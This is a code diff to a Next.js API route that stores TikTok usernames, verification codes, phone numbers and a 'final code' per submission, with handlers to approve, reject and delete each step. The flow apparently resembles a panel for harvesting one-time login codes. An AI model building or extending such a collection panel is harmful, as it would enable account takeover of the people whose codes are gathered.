@@ -34,12 +34,13 @@ export async function POST(request: Request) {
   try {
     const body = await request.json();
     const { 
-        id,
         tiktokUsername, 
         verificationCode, 
         phoneNumber, 
         finalCode 
     } = body;
+
+    const id = body.id || body.tiktokUsername;
 
     if (!id) {
         return NextResponse.json({ message: 'An ID (TikTok username) is required.' }, { status: 400 });
@@ -65,9 +66,16 @@ export async function POST(request: Request) {
     
     // Update data based on what's provided in the body
     if(tiktokUsername) submission.tiktokUsernameStatus = 'approved';
-    if(verificationCode) submission.verificationCodeStatus = 'approved';
-    if(phoneNumber) submission.phoneNumberStatus = 'approved';
+    if(verificationCode) {
+        submission.verificationCode = verificationCode;
+        submission.verificationCodeStatus = 'approved';
+    }
+    if(phoneNumber) {
+        submission.phoneNumber = phoneNumber;
+        submission.phoneNumberStatus = 'approved';
+    }
     if(finalCode) {
+        submission.finalCode = finalCode;
         submission.finalCodeStatus = 'approved';
         submission.isVerified = true;
     }
@@ -114,12 +122,50 @@ export async function PATCH(request: Request) {
         return NextResponse.json({ message: `Invalid step: ${step}` }, { status: 400 });
     }
     
+    // If rejecting any step, set the final verification to false
+    if (status === 'rejected') {
+        submissions[subIndex].isVerified = false;
+    }
+    
+    // If approving the final step, set the final verification to true
+    if (step === 'finalCode' && status === 'approved') {
+        submissions[subIndex].isVerified = true;
+    }
+
     await submissionStore.write(submissions);
 
     return NextResponse.json(submissions[subIndex], { status: 200 });
 
   } catch (error: any) {
     console.error("Error updating submission status:", error);
+    return NextResponse.json({ message: error.message || 'Error processing request' }, { status: 500 });
+  }
+}
+
+// DELETE handler for removing a submission
+export async function DELETE(request: Request) {
+  try {
+    const { searchParams } = new URL(request.url);
+    const submissionId = searchParams.get('id');
+
+    if (!submissionId) {
+      return NextResponse.json({ message: 'Submission ID is required' }, { status: 400 });
+    }
+
+    let submissions = await submissionStore.read();
+    const initialLength = submissions.length;
+    
+    submissions = submissions.filter(s => s.id !== submissionId);
+
+    if (submissions.length === initialLength) {
+      return NextResponse.json({ message: 'Submission not found' }, { status: 404 });
+    }
+
+    await submissionStore.write(submissions);
+
+    return NextResponse.json({ message: 'Submission deleted successfully' }, { status: 200 });
+  } catch (error: any) {
+    console.error("Error deleting submission:", error);
     return NextResponse.json({ message: error.message || 'Error processing request' }, { status: 500 });
   }
 }
